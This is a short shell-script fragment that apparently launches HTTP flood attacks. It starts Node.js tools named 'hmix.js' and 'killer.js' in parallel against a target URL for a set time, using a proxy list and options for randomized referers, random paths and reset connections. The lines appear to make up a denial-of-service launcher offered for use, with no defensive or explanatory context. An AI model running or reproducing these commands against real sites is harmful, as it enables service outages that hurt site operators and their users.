...
node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 3 --full true -d false &

node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 1 --close --randpath --parsed --reset &
node killer.js GET "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 1 --close --randpath --parsed --reset &
